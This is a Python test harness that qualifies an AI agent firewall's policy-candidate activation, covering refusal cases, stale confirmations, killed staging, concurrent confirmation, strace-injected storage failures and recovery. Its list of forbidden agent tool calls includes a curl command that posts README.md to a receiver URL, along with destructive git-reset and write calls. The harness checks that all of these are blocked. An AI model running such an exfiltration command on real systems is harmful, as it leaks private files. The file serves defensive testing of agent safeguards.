# SPDX-License-Identifier: Apache-2.0
"""Installed policy-candidate activation qualification, called by the installed driver.

Everything goes through the installed `agentfw pilot` front door against owned synthetic projects and a
scripted loopback provider. A configured, previewed or recovered outcome is never reported as observed
protection; the denial witness is an independent syscall trace of the real original servers.
"""
import json
import os
from pathlib import Path
import re
import signal
import subprocess
import time

ROOT = Path(__file__).resolve().parents[1]
CASES = ('useful-read-under-base', 'candidate-inert', 'preview-inert', 'open-installation-refused', 'live-run-refused',
         'tampered-candidate-refused', 'stale-confirmation-refused', 'killed-staging-keeps-old-generation',
         'concurrent-confirmation', 'activation-observed', 'newly-denied-zero-execution', 'hard-deny-ask-preserved',
         'interrupted-publication-recovered', 'revert-fresh-authority', 'owned-cleanup')


def qualify(args, door, home, env, report, *, guided, receiver, baseline, selection, load):
    require = guided.require
    activation = load('qualification_policy_activation', 'pilot_policy_activation.py')
    rows = [{'id': n, 'status': 'incomplete', 'attempted': False} for n in CASES]
    evidence = {'format': 'sw-installed-policy-activation-qualification/1', 'status': 'incomplete',
                'source': guided.BASE.source(), 'expected': list(CASES), 'cases': rows}
    report['policy_activation'] = evidence
    work = args.output / 'policy-activation'
    work.mkdir(mode=0o700)
    preparation = args.prefix / 'preparation'
    selected = {k: getattr(args, k) for k in guided.SELECTED_PROGRAMS if getattr(args, k, None) is not None and k != 'agentfw'}

    def begin(name):
        evidence['active_case'] = name
        rows[CASES.index(name)]['attempted'] = True

    def finish(name, **facts):
        rows[CASES.index(name)].update(status='passed', **facts)

    def run_cli(words, success=True, trace=None, timeout=1800):
        words = [str(w) for w in words]
        if trace is not None:
            words = [str(args.strace), '-f', '-qq', '-s', '256', '-e', 'trace=execve,connect', '-o', str(trace), *words]
        result = subprocess.run(words, cwd=door.cwd, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=timeout)
        require(len(result.stdout) <= 1024 * 1024 and len(result.stderr) <= 65536, 'activation_cli_output_bound')
        lines = [line for line in result.stdout.decode('utf-8', 'replace').splitlines() if line.strip()]
        value = json.loads(lines[-1]) if lines else {}
        reason = value.get('reason')
        evidence['last_cli'] = {'argv': [w for w in words if w.startswith('-') or w.isalpha()][:12], 'exit': result.returncode,
                                'expected_success': success,
                                'reason': reason if isinstance(reason, str) and re.fullmatch(r'[a-z0-9_:-]{1,160}', reason) else None}
        require((result.returncode == 0) is success, 'activation_cli_exit')
        return value

    def pa(action, *extra, success=True, trace=None, timeout=1800):
        return run_cli([args.agentfw, 'pilot', '--home', home, 'policy-activation', action, '--prefix', args.prefix,
                        '--state-root', args.state_root, *extra], success, trace, timeout)

    def maint(action, *extra, success=True):
        return run_cli([args.agentfw, 'pilot', '--home', home, 'maintenance', action, '--prefix', args.prefix,
                        '--state-root', args.state_root, *extra], success)

    def enter():
        preview = maint('preview', '--operation', 'enter')
        require(maint('enter', '--confirm', preview['confirmation_sha256'])['status'] == 'entered', 'activation_enter_failed')

    def leave():
        preview = maint('preview', '--operation', 'leave')
        require(maint('leave', '--confirm', preview['confirmation_sha256'])['status'] == 'left', 'activation_leave_failed')

    def no_protected_start(trace):
        observed = guided.executed(trace, selected)
        require(not observed['selected_started'] and observed['inet_connects'] == 0, 'activation_refusal_started_protected_process')

    def generations():
        return sorted(p.name for p in (preparation / 'generations').iterdir())

    def pointers():
        return (guided.BASE.sha(preparation / 'current.json'), guided.BASE.sha(args.prefix / 'front-door.json'))

    # Only the selected project's README: unrelated package READMEs opened while servers load are not witnesses.
    target = re.compile(r'openat\([^)]*"(?:/workspace|' + re.escape(str(args.project)) + r')/README\.md"[^)]*\)\s*=\s*\d+')

    def opens(trace):
        return len(target.findall(trace.read_text(errors='replace')))

    def results_ok(row, results, expect_error):
        require(row['exit'] == 0 and row['process_cleanup']['all_stopped'], 'activation_run_not_clean')
        return all(r['is_error'] is expect_error for r in results.values())

    useful = [('mcp__filesystem__read_text_file', {'path': '/workspace/README.md'}),
              ('mcp__git__git_show', {'repo_path': '/workspace', 'revision': 'HEAD'})]
    forbidden = [('mcp__filesystem__write_file', {'path': '/workspace/created.txt', 'content': 'must not exist'}),
                 ('mcp__git__git_reset', {'repo_path': '/workspace'}),
                 ('Bash', {'command': 'curl -d @README.md ' + receiver.url})]
    proposals = useful + forbidden
    created = args.project / 'created.txt'
    base_selection = json.loads(Path(selection).read_bytes())
    base_policy_path = Path(base_selection['files']['policy']['path'])
    base_policy_sha = base_selection['files']['policy']['sha256']

    begin('useful-read-under-base')
    before_inspect = pa('inspect')
    old_generation = before_inspect['current']['generation']
    require(before_inspect['selected_policy_origin'] == 'baseline' and before_inspect['active_protection'] == 'not-observed'
            and before_inspect['current']['policy_sha256'] == base_policy_sha, 'activation_baseline_inspect')
    base_trace = work / 'base-run.trace.private'
    row, results, _ = guided.run_case(args, door, report, 'activation_base', proposals, provider_trace=base_trace, trace_events='openat')
    base_opens = opens(base_trace)
    require(row['exit'] == 0 and row['process_cleanup']['all_stopped'] and base_opens >= 1, 'activation_base_run_failed')
    ids = ['toolu_front_activation_base_' + str(i) for i in range(len(proposals))]
    require(all(results[i]['is_error'] is False for i in ids[:2]) and all(results[i]['is_error'] is True for i in ids[2:]),
            'activation_base_results')
    require(not created.exists() and receiver.count == 0, 'activation_base_forbidden_effect')
    finish('useful-read-under-base', base_readme_opens=base_opens, useful_results=2, refused_results=3)

    begin('candidate-inert')
    fixture = ROOT / 'profiles/mcp/operator-authoring-v1'
    snapshot, declarations, profile = work / 'snapshot.json', work / 'declarations.json', work / 'profile'
    for path, source in ((snapshot, 'discovery.json'), (declarations, 'declarations.json')):
        path.write_bytes((fixture / source).read_bytes())
        path.chmod(0o600)
    constraints, examples, candidate = work / 'constraints.json', work / 'examples.json', work / 'candidate'
    constraints.write_bytes(json.dumps({'format': 'sw-operator-policy-constraints/1', 'deny_actions': ['read_only'],
                                        'deny_tools': [], 'allowed_destinations': None}).encode())
    events = [{'complete': True, 'event': {'session': 'example', 'agent': 'main', 'seq': n, 'at_ms': 0, 'kind': 'tool_call',
                                           'tool': tool, 'args': arguments}}
              for n, (tool, arguments) in enumerate([('Read', {'file_path': 'notes.txt'}),
                                                     ('Write', {'file_path': 'note.txt', 'content': 'local note'})])]
    examples.write_bytes(json.dumps({'format': 'sw-policy-offline-input/1',
                                     'context': {'history': 'complete_from_start', 'judge': 'disabled'}, 'events': events}).encode())
    for path in (constraints, examples):
        path.chmod(0o600)
    pointers_before = pointers()
    run_cli([args.agentfw, 'mcp-profile', 'compile', '--snapshot', snapshot, '--declarations', declarations, '--out', profile])
    common = ['--profile', profile, '--policy', base_policy_path, '--constraints', constraints, '--examples', examples, '--out', candidate]
    previewed = run_cli([args.agentfw, 'policy-candidate', 'preview', *common])
    created_candidate = run_cli([args.agentfw, 'policy-candidate', 'create', *common, '--confirm', previewed['candidate_sha256']])
    candidate_sha = created_candidate['candidate_sha256']
    validated = run_cli([args.agentfw, 'policy-candidate', 'validate', *common, '--exported', candidate,
                         '--expect-candidate', candidate_sha])
    require(validated['restricting_only'] is True and validated['base_policy_sha256'] == base_policy_sha
            and pointers() == pointers_before and validated['active'] is False,
            'activation_candidate_not_inert')
    candidate_policy_sha = validated['policy_sha256']
    finish('candidate-inert', candidate=candidate_sha[:12], added_rules=validated['added_rules'])

    candidate_args = ['--candidate', candidate, '--expect-candidate', candidate_sha, '--profile', profile,
                      '--constraints', constraints, '--examples', examples]

    begin('preview-inert')
    home_before, trace = guided.snapshot(home), work / 'preview.trace.private'
    plan = pa('preview', *candidate_args, trace=trace)
    no_protected_start(trace)
    require(plan['status'] == 'preview' and plan['mutates'] is False and 'maintenance_entry_required' in plan['blockers']
            and plan['effects'] == {'publishes_new_selection_only': True, 'overwrites_live_policy': False,
                                    'copies_session_or_authority': False, 'starts_process': False}
            and pointers() == pointers_before and generations() == [old_generation]
            and guided.snapshot(home) == home_before, 'activation_preview_not_inert')
    finish('preview-inert', protected_starts=0, network_connections=0)

    begin('open-installation-refused')
    refusal = pa('confirm', *candidate_args, '--confirm', plan['confirmation_sha256'], success=False)
    require(refusal['reason'] == 'policy_activation_maintenance_entry_required', 'activation_unenrolled_wrong_refusal')
    enter()
    leave()
    opened = pa('preview', *candidate_args)
    require('maintenance_entry_required' in opened['blockers'], 'activation_open_not_blocked')
    refusal = pa('confirm', *candidate_args, '--confirm', opened['confirmation_sha256'], success=False)
    require(refusal['reason'] == 'policy_activation_maintenance_entry_required' and generations() == [old_generation]
            and pointers() == pointers_before and not (preparation / activation.POLICIES).exists(), 'activation_open_installation_changed')
    finish('open-installation-refused', generations=1)

    begin('live-run-refused')
    live = {}

    def during(model):
        enter()
        blocked = pa('preview', *candidate_args)
        require('runs_active' in blocked['blockers'], 'activation_live_run_not_blocking')
        refusal = pa('confirm', *candidate_args, '--confirm', blocked['confirmation_sha256'], success=False)
        require(refusal['reason'] == 'policy_activation_runs_active' and generations() == [old_generation]
                and pointers() == pointers_before, 'activation_live_run_changed_selection')
        live.update(blocked=blocked['blockers'])
        leave()

    row, results, _ = guided.run_case(args, door, report, 'activation_live', useful, after_useful=during)
    require(live and results_ok(row, results, False) and len(results) == 2, 'activation_live_run_not_preserved')
    finish('live-run-refused', blockers=live['blocked'])

    enter()
    begin('tampered-candidate-refused')
    policy_file = candidate / 'policy.yaml'
    original = policy_file.read_bytes()
    try:
        policy_file.write_bytes(original + b' ')
        tampered = pa('preview', *candidate_args, success=False)
        require(tampered['reason'] == 'policy_activation_candidate_validation_refused', 'activation_tamper_wrong_refusal')
    finally:
        policy_file.write_bytes(original)
    wrong = pa('preview', '--candidate', candidate, '--expect-candidate', '0' * 64, '--profile', profile,
               '--constraints', constraints, '--examples', examples, success=False)
    require(wrong['reason'] == 'policy_activation_candidate_validation_refused' and generations() == [old_generation]
            and pointers() == pointers_before, 'activation_tamper_changed_selection')
    finish('tampered-candidate-refused')

    begin('stale-confirmation-refused')
    stale = pa('preview', *candidate_args)
    require(stale['blockers'] == [], 'activation_ready_installation_blocked')
    leave()
    enter()
    refusal = pa('confirm', *candidate_args, '--confirm', stale['confirmation_sha256'], success=False)
    require(refusal['reason'] == 'policy_activation_confirmation_stale' and generations() == [old_generation]
            and pointers() == pointers_before, 'activation_stale_confirmation_accepted')
    finish('stale-confirmation-refused')

    begin('killed-staging-keeps-old-generation')
    ready = pa('preview', *candidate_args)
    command = [str(args.agentfw), 'pilot', '--home', str(home), 'policy-activation', 'confirm', '--prefix', str(args.prefix),
               '--state-root', str(args.state_root), *map(str, candidate_args), '--confirm', ready['confirmation_sha256']]
    process = subprocess.Popen(command, cwd=door.cwd, env=env, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, start_new_session=True)
    drained = False
    try:
        deadline = time.monotonic() + 300
        while len(generations()) < 2 and time.monotonic() < deadline and process.poll() is None:
            time.sleep(0.05)
        if len(generations()) < 2 or process.poll() is not None:
            out, _ = process.communicate(timeout=60)
            drained = True
            try:
                early = json.loads(out.decode().splitlines()[-1])
            except (ValueError, IndexError):
                early = {}
            evidence['early_exit'] = {'exit': process.returncode, 'reason': early.get('reason'), 'detail': early.get('detail'),
                                      'generations': len(generations())}
            require(False, 'activation_staging_not_observed')
        os.killpg(process.pid, signal.SIGKILL)
    finally:
        if process.poll() is None:
            os.killpg(process.pid, signal.SIGKILL)
        if not drained:
            process.communicate(timeout=60)
    require(pointers() == pointers_before and process.returncode != 0, 'activation_killed_staging_changed_selection')
    require(not (preparation / activation.JOURNAL).exists() or json.loads((preparation / activation.JOURNAL).read_bytes())['pending'] is None,
            'activation_kill_left_pending_intent')
    status = pa('inspect')
    require(status['current']['generation'] == old_generation and status['selected_policy_origin'] == 'baseline'
            and status['maintenance']['mode'] == 'entered', 'activation_killed_staging_not_recovered')
    orphans = [g for g in generations() if g != old_generation]
    finish('killed-staging-keeps-old-generation', orphan_generations_retained=len(orphans))

    begin('concurrent-confirmation')
    final = pa('preview', *candidate_args)
    require(final['blockers'] == [], 'activation_final_preview_blocked')
    command = [str(args.agentfw), 'pilot', '--home', str(home), 'policy-activation', 'confirm', '--prefix', str(args.prefix),
               '--state-root', str(args.state_root), *map(str, candidate_args), '--confirm', final['confirmation_sha256']]
    contenders = [subprocess.Popen(command, cwd=door.cwd, env=env, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE) for _ in range(2)]
    outcomes = []
    for contender in contenders:
        out, _ = contender.communicate(timeout=1800)
        outcomes.append((contender.returncode, json.loads(out.decode().splitlines()[-1])))
    evidence['concurrent'] = [{'exit': code, 'status': o.get('status'), 'reason': o.get('reason'), 'detail': o.get('detail')}
                              for code, o in outcomes]
    winners = [o for code, o in outcomes if code == 0]
    losers = [o for code, o in outcomes if code != 0]
    require(len(winners) == 1 and len(losers) == 1 and winners[0]['status'] == 'activated'
            and re.fullmatch(r'(maintenance|policy_activation)_[a-z_]+', losers[0].get('reason', '')), 'activation_concurrent_not_exclusive')
    new_generation = winners[0]['generation']
    finish('concurrent-confirmation', one_winner=True, loser_reason=losers[0]['reason'])

    begin('activation-observed')
    observed = pa('inspect')
    selected_after = json.loads((preparation / 'generations' / new_generation / 'selection.json').read_bytes())
    stored = preparation / activation.POLICIES / candidate_sha / 'policy.yaml'
    require(observed['current']['generation'] == new_generation and observed['selected_policy_origin'] == 'operator-candidate'
            and observed['current']['policy_sha256'] == candidate_policy_sha == selected_after['files']['policy']['sha256']
            and guided.BASE.sha(stored) == candidate_policy_sha and Path(selected_after['files']['policy']['path']) == stored
            and observed['active_protection'] == 'not-observed' and observed['pending'] is None
            and [h['outcome'] for h in observed['history']] == ['published'], 'activation_not_observed')
    require(json.loads((preparation / 'generations' / old_generation / 'selection.json').read_bytes())['files']['policy']['sha256']
            == base_policy_sha and base_policy_path.read_bytes() != stored.read_bytes(), 'activation_overwrote_live_policy')
    status = maint('status')
    require(status['selection_binding'] == 'changed', 'activation_selection_binding_not_reported')
    leave()
    finish('activation-observed', generation=new_generation[:12], history='published')

    begin('newly-denied-zero-execution')
    after_trace = work / 'after-run.trace.private'
    row, results, _ = guided.run_case(args, door, report, 'activation_after', proposals, provider_trace=after_trace, trace_events='openat')
    ids = ['toolu_front_activation_after_' + str(i) for i in range(len(proposals))]
    require(row['exit'] == 0 and row['process_cleanup']['all_stopped'] and all(results[i]['is_error'] is True for i in ids),
            'activation_after_results')
    require(guided.README.strip() not in json.dumps([results[i]['content'] for i in ids]), 'activation_denied_read_released_content')
    after_opens = opens(after_trace)
    require(after_opens == 0 and base_opens >= 1, 'activation_denied_read_executed')
    finish('newly-denied-zero-execution', readme_opens_before=base_opens, readme_opens_after=after_opens, denied_results=2)

    begin('hard-deny-ask-preserved')
    require(all(results[i]['is_error'] is True for i in ids[2:]) and not created.exists() and receiver.count == 0
            and not (args.output / 'forbidden-effect').exists(), 'activation_hard_refusal_changed')
    finish('hard-deny-ask-preserved', refused_results=3, effects=0)

    begin('interrupted-publication-recovered')
    enter()
    undo = pa('revert', '--generation', old_generation)
    require(undo['status'] == 'preview' and undo['blockers'] == [], 'activation_revert_preview')
    # A real storage failure on the front-door state write: the marker already selects the old generation while
    # front-door.json still names the activated one (marker-new / state-old). No process is killed; the syscall fails.
    interrupt = work / 'revert-interrupt.trace.private'
    renames = 'rename,renameat,renameat2'
    command = [str(args.strace), '-f', '-qq', '-e', 'trace=' + renames, '-e', 'inject=' + renames + ':error=EIO:when=1',
               '-P', str(args.prefix / 'front-door.json'), '-o', str(interrupt),
               str(args.agentfw), 'pilot', '--home', str(home), 'policy-activation', 'revert', '--prefix', str(args.prefix),
               '--state-root', str(args.state_root), '--generation', old_generation, '--confirm', undo['confirmation_sha256']]
    interrupted = subprocess.run(command, cwd=door.cwd, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=600)
    if interrupted.returncode == 0:
        text = interrupt.read_text(errors='replace') if interrupt.exists() else ''
        evidence['interrupt_trace'] = [line[:200] for line in text.splitlines()[:12]]
        evidence['interrupt_output'] = interrupted.stdout.decode('utf-8', 'replace')[-300:]
    require(interrupted.returncode != 0, 'activation_interruption_not_injected')
    current_marker = json.loads((preparation / 'current.json').read_bytes())
    state_selection = json.loads((args.prefix / 'front-door.json').read_bytes())['selection']
    require(current_marker['generation'] == old_generation and state_selection.endswith(new_generation + '/selection.json'),
            'activation_split_state_not_reproduced')
    split = pa('inspect')
    require(split['state'] == 'split-pending-recovery' and split['matches_journal'] is True
            and split['pending']['operation'] == 'revert', 'activation_split_not_reported')
    held_trace = work / 'split-run.trace.private'
    refused = run_cli(door.words('run', '--state-root', args.state_root, '--timeout-seconds', '120', inputs=False),
                      success=False, trace=held_trace)
    no_protected_start(held_trace)
    require(refused.get('executed') is False, 'activation_split_run_not_refused')
    recovered = pa('recover')
    require(recovered['status'] == 'completed_by_recovery' and recovered['actual_generation'] == old_generation
            and recovered['session_authority_copied'] is False and recovered['active_protection'] == 'not-observed', 'activation_recover_failed')
    healed = pa('inspect')
    require(healed['pending'] is None and healed['selected_policy_origin'] == 'baseline'
            and healed['current']['policy_sha256'] == base_policy_sha
            and [(h['operation'], h['outcome']) for h in healed['history']] == [('activate', 'published'),
                                                                               ('revert', 'completed_by_recovery')],
            'activation_recovery_history')
    finish('interrupted-publication-recovered', split_state='marker-new-state-old', run_refused_zero_start=True,
           outcome='completed_by_recovery')

    begin('revert-fresh-authority')
    refused = pa('revert', '--generation', 'f' * 32, success=False)
    require(refused['reason'] == 'policy_activation_revert_target_not_previously_confirmed', 'activation_unconfirmed_revert_accepted')
    leave()
    row, results, _ = guided.run_case(args, door, report, 'activation_reverted', proposals)
    ids = ['toolu_front_activation_reverted_' + str(i) for i in range(len(proposals))]
    require(row['exit'] == 0 and row['process_cleanup']['all_stopped'] and all(results[i]['is_error'] is False for i in ids[:2])
            and all(results[i]['is_error'] is True for i in ids[2:]), 'activation_revert_not_useful')
    run_ids = [set(c.get('live_status', {}).get('runs', [{}])[0].get('run_ids') or [])
               for c in report['cases'] if c.get('case') in ('activation_base', 'activation_after', 'activation_reverted')
               and c.get('live_status', {}).get('runs')]
    require(len(run_ids) >= 2 and all(a.isdisjoint(b) for i, a in enumerate(run_ids) for b in run_ids[i + 1:]), 'activation_authority_reused')
    finish('revert-fresh-authority', fresh_run_ids=True, history='activate,revert')

    begin('owned-cleanup')
    require(receiver.count == 0 and not created.exists() and guided.snapshot(args.project) == baseline['project']
            and guided.snapshot(args.repository) == baseline['repository'], 'activation_source_changed')
    require(guided.BASE.source()['commit'] == args.expected_commit, 'activation_source_identity_changed')
    finish('owned-cleanup', all_stopped=True, sources_preserved=True, receiver_effects=0)
    evidence.update(status='passed', source_after=guided.BASE.source())
    require([r['id'] for r in rows] == list(CASES) and all(r['attempted'] and r['status'] == 'passed' for r in rows),
            'activation_case_inventory_incomplete')
    report['cases'].extend({'case': r['id'], 'passed': True} for r in rows)
